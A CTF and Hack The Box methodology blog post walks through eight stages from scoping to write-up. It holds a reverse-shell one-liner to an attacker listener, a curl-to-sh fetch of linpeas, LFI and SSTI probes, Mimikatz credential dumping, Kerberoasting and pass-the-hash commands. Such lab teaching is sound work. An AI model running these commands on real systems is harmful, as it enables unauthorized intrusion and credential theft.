```json
{
  "title": "My CTF Workflow: From Setup to Report",
  "metaTitle": "My CTF Workflow: From Setup to Report",
  "metaDescription": "Eight stages for a CTF or HTB lab, from scoping and recon through exploitation, pivoting, cleanup, and reporting.",
  "slug": "ctf-workflow",
  "openGraphImagePrompt": "A clean terminal-inspired editorial diagram for an eight-stage CTF workflow: scoping, setup, enumeration, foothold, shell, privilege escalation, pivoting, and reporting; charcoal background, restrained blue and teal accents, readable spacing, no logos or neon effects.",
  "tags": ["CTF", "Hack The Box", "Enumeration", "Privilege Escalation"],
  "keyTakeaway": "Eight stages, recon through report, for HTB and local VM labs.",
  "summary": "How I primarily approach CTFs and Labs: Set up a workspace, enumerate deliberately, verify findings, record each step, and finish with a clear write-up. The stages below reflect my typical process rather than an exhaustive command list.",
  "author": "David Awosusi",
  "category": "CTF Workflow",
  "publishedAt": "2021-08-12",
  "visual": {
    "title": "Eight stages, recon through report",
    "caption": "The sequence from scoping and setup through enumeration, access, cleanup, and reporting.",
    "steps": [
      { "label": "1 · Scope", "detail": "Confirm target, VPN, and platform rules." },
      { "label": "2 · Setup", "detail": "Set variables, create folders, and log the session." },
      { "label": "3 · Enumerate", "detail": "Map ports, web paths, hostnames, and services." },
      { "label": "4 · Foothold", "detail": "Check a suspected weakness and verify the result." },
      { "label": "5 · Shell", "detail": "Get a shell and stabilize the terminal." },
      { "label": "6 · Privesc", "detail": "Check local privileges and escalation paths." },
      { "label": "7 · Pivot", "detail": "Reach deeper hosts through the compromised machine." },
      { "label": "8 · Report", "detail": "Collect proof, clean up, and document the path." }
    ]
  },
  "schema": {
    "title": "Keep evidence attached to the finding",
    "caption": "Connect the target and service to the command, evidence, validation, and resulting access or impact.",
    "joinLabel": "target → finding → report",
    "standards": [
      {
        "name": "Target notes",
        "fields": [
          { "name": "target", "meaning": "Challenge host or address" },
          { "name": "port_service", "meaning": "Open port and service" },
          { "name": "hostname", "meaning": "Virtual host or DNS name" },
          { "name": "evidence_path", "meaning": "Saved scan or request output" }
        ]
      },
      {
        "name": "Finding notes",
        "fields": [
          { "name": "hypothesis", "meaning": "What may be vulnerable" },
          { "name": "command", "meaning": "The test that was run" },
          { "name": "observed_result", "meaning": "Output that supports or rejects it" },
          { "name": "validation", "meaning": "How the finding was confirmed" }
        ]
      }
    ],
    "output": {
      "name": "Write-up section",
      "fields": ["recon", "foothold", "privesc", "flags", "cleanup"]
    }
  }
}
```

## Stage 1: Scoping & Rules of Engagement

Confirm the target before running anything: an active VPN session, a box assigned to you, and any platform-specific rules (no attacking other users' instances, no DoS).

Connect with the platform VPN profile:

```bash
sudo openvpn lab_platform.ovpn
```

Or for WireGuard:

```bash
sudo wg-quick up lab
```

HTB only allows writeups for retired machines — check before you publish.

## Stage 2: Pre-Engagement & Environment Setup

Set the target address once, make a place for each kind of output, and record the terminal session. That saves time later, when a command needs to be repeated or the path needs to be explained. Replace the example address with the address assigned to the challenge.

```bash
export IP=10.129.238.31
export BOX=variatype
mkdir -p ~/htb/$BOX/{scans,web,exploits,loot,creds}
cd ~/htb/$BOX
script -a engagement_log.txt
```

`script -a` captures raw terminal I/O for the eventual report. Type `exit` when finished to close the recording. For a session you can detach and reattach, run the whole engagement inside tmux instead:

```bash
tmux new -s "$BOX"
```

## Stage 3: Enumeration

### Ports

Start with a full TCP scan, then run version and default-script checks against the ports that are open. This separates broad discovery from the slower work of examining each service.

```bash
nmap -p- --min-rate 5000 -oN scans/all_ports.nmap "$IP"
```

Replace `22,80` with the ports found in the first scan:

```bash
PORTS=22,80
nmap -sC -sV -p "$PORTS" -oN scans/targeted.nmap "$IP"
```

UDP needs its own scan. Start with the top 20 ports:

```bash
nmap -sU --top-ports 20 -oN scans/udp_top20.nmap "$IP"
```

RustScan is faster for the first pass on a wide port range. Resolve any hostnames you find before moving on:

```bash
echo "$IP $BOX.htb" | sudo tee -a /etc/hosts
```

### Web hosts and paths

If HTTP or HTTPS is open, fingerprint the site and browse it before fuzzing. Note redirects, page titles, login forms, and hostnames. A web server may return the same default page for every guessed name, so compare responses and filter that baseline carefully.

```bash
whatweb "http://$IP"
nikto -h "http://$IP"
```

If the challenge reveals virtual hosts, add the name to `/etc/hosts` so the browser and tools resolve it to the target.

```bash
echo "$IP $BOX.htb" | sudo tee -a /etc/hosts
```

Use a virtual-host wordlist when hostnames are likely. Get the baseline response size first:

```bash
BASELINE_SIZE=$(curl -s -o /dev/null -w '%{size_download}' -H "Host: invalid.$BOX.htb" "http://$BOX.htb/")
ffuf -u "http://$BOX.htb/" -H "Host: FUZZ.$BOX.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs "$BASELINE_SIZE"
```

Check `robots.txt`, then enumerate directories and common file extensions on each promising host:

```bash
curl -s "http://$BOX.htb/robots.txt"
```

```bash
feroxbuster -u "http://$BOX.htb/" \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,bak -o web/portal-ferox.txt
```

Avoid running several large wordlists at once. Start small, review status codes and response sizes, and expand when a result points somewhere useful. The [ffuf guide](https://github.com/ffuf/ffuf) and [feroxbuster documentation](https://epi052.github.io/feroxbuster-docs/) list additional options.

WordPress or Drupal targets:

```bash
wpscan --url "http://$BOX.htb" --enumerate vp,vt,u
droopescan scan drupal -u "http://$BOX.htb"
```

If a `.git` directory is exposed, retrieve it and inspect its history:

```bash
git-dumper "http://$BOX.htb/.git/" ./loot/repo
cd loot/repo && git log --all && gitleaks detect -v
```

### SMB, RPC, and AD-adjacent services

For SMB, check whether shares can be listed without credentials:

```bash
smbclient -L "//$IP/" -N
smbmap -H "$IP"
enum4linux-ng -A "$IP"
nxc smb "$IP" --shares -u '' -p ''
```

`nxc` (NetExec) is the maintained fork of the now-retired CrackMapExec. A null session may reveal share names or account information.

### Everything else worth a look

- **SNMP:**

```bash
snmpwalk -c public -v1 "$IP"
```

- **FTP:** Test anonymous login.
- **SMTP:**

```bash
smtp-user-enum -M VRFY -U userlist.txt -t "$IP"
```

- **LDAP, if the box is a DC:**

```bash
BASE_DN='dc=example,dc=local'
ldapsearch -x -H "ldap://$IP" -b "$BASE_DN"
```

## Stage 4: Vulnerability Analysis & Foothold

Match service information to a plausible issue, then test the relevant behavior. A version string is a lead, not proof that a target is vulnerable.

```bash
searchsploit "apache 2.4.52"
```

Copy an Exploit-DB entry by its ID. Replace `12345` with the ID returned by SearchSploit:

```bash
EDB_ID=12345
searchsploit -m "$EDB_ID"
```

If the target is a web app, a few quick tests cover most CTF footholds:

- **SSTI:** Put `{{7*7}}` in an input field. If `49` comes back, the template is evaluating the expression; it does not by itself prove RCE.
- **LFI:**

```bash
curl -i "http://$IP/view?file=../../../../etc/passwd"
```

Then try PHP wrappers (`php://filter/convert.base64-encode/resource=`).
- **SQLi:** Try a lone `'` to trigger an error, then use sqlmap if it looks real:

```bash
URL='http://variatype.htb/item?id=1'
sqlmap -u "$URL" --batch
```

- **Upload forms:** Test extension filtering, content type, and magic bytes.

## Stage 5: Exploitation & Shell Stabilization

After you get a shell, use the address of your lab interface for the callback and start a listener first.

```bash
nc -lvnp 4444
```

Set `LHOST` to your VPN interface address, then start the reverse shell:

```bash
export LHOST=10.10.14.3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.environ["LHOST"],4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

A shell may still need a local terminal upgrade. In the connected shell, start a PTY; then suspend it locally, enable raw terminal mode, and return to the session.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Press `Ctrl-Z` in the local terminal, then run:

```bash
stty raw -echo; fg
```

Press `Enter` after the foreground shell resumes, then set the terminal type:

```bash
export TERM=xterm
```

`pwncat-cs -lp 4444` as the listener does most of this automatically if you'd rather skip the manual steps:

```bash
pwncat-cs -lp 4444
```

## Stage 6: Privilege Escalation

Start with what the current account is allowed to do. On Linux, `sudo -l` is a good first check; inspect file permissions, scheduled tasks, credentials, and service configuration only when the evidence points there.

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*/
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

A tool such as [LinPEAS](https://github.com/peass-ng/PEASS-ng) can help gather local evidence. Run pspy alongside linpeas — it catches cron jobs linpeas can miss. A sudo-able command or SUID binary isn't automatically a dead end: check [GTFOBins](https://gtfobins.github.io/) before giving up on it.

### Windows / Active Directory

```powershell
whoami /priv
systeminfo
```

Automated enum: winPEAS.exe, PowerUp.ps1, Seatbelt.exe. For the domain itself:

- **BloodHound:** SharpHound maps the shortest path to Domain Admin.

```powershell
SharpHound.exe -c All
```

- **Mimikatz:** These commands pull creds from memory with local admin.

```text
privilege::debug
sekurlsa::logonpasswords
```

- **Kerberoasting:**

```bash
impacket-GetUserSPNs domain/user:pass -dc-ip "$IP" -request
```

- **AS-REP roasting:**

```bash
impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip "$IP"
```

LOLBAS is the Windows equivalent of GTFOBins.

## Stage 7: Lateral Movement & Pivoting

A local SSH forward makes a service bound to the target's loopback address available on your own machine:

```bash
ssh -L 8080:127.0.0.1:80 "user@$IP"
```

No SSH available? Set up Chisel instead:

```bash
./chisel server -p 8000 --reverse        # attacker
./chisel client 10.10.14.3:8000 R:socks # target
proxychains nmap -sT -Pn 10.10.10.0/24
```

Replace the example addresses with the ones for the lab. Ligolo-ng is a newer alternative that gives you a real tun interface instead of a SOCKS proxy.

With a usable credential or hash, move laterally against AD directly:

```bash
NTLM_HASH=0123456789abcdef0123456789abcdef
evil-winrm -i "$IP" -u Administrator -H "$NTLM_HASH"
impacket-psexec domain/user:pass@"$IP"
impacket-wmiexec domain/user:pass@"$IP"
```

## Stage 8: Loot, Cleanup & Reporting

Collect the proof and basic host details:

```bash
cat user.txt root.txt
hostname; id; whoami
```

Before you disconnect:

- Delete anything you uploaded (linpeas.sh, nc.exe, chisel binaries). Even though this is a lab exercise conducted in an environment with no real-world consequences, it still serves as valuable practice for developing good OPSEC habits.
- Remove log entries, artifacts, users, SSH keys, or cron entries you added.
- Restore any files you modified.

Build the report from `engagement_log.txt` plus screenshots, structured as Recon → Foothold → Privesc → Flags, with the why it worked called out at each step — that's what makes a writeup worth reading over a raw command transcript. Confirm the box is retired before publishing, and redact anything that would make a still-active challenge trivial.

A useful write-up includes:

- The target scope and initial service map.
- The evidence that led to each next step.
- The vulnerability or misconfiguration that enabled access.
- The commands and conditions needed to reproduce the result.
- The privilege escalation path and proof, with flags redacted from public screenshots.
- Any files or changes made during the exercise.

Keep the terminal log and scan output with the notes until the write-up is complete.

## Quick Reference

| Stage | Goal | Primary tools |
| --- | --- | --- |
| 1. Scoping | Confirm authorization | VPN client |
| 2. Setup | Environment, logging | tmux, script |
| 3. Enumeration | Map the attack surface | nmap, feroxbuster/ffuf, enum4linux-ng, nxc |
| 4. Vuln analysis | Find the way in | searchsploit, manual testing |
| 5. Exploitation | Get a shell | nc, reverse shell payloads |
| 6. Privesc | Get root / SYSTEM | linpeas, winPEAS, BloodHound, Mimikatz |
| 7. Pivoting | Reach deeper hosts | chisel, ligolo-ng, evil-winrm |
| 8. Reporting | Document it | engagement_log.txt |
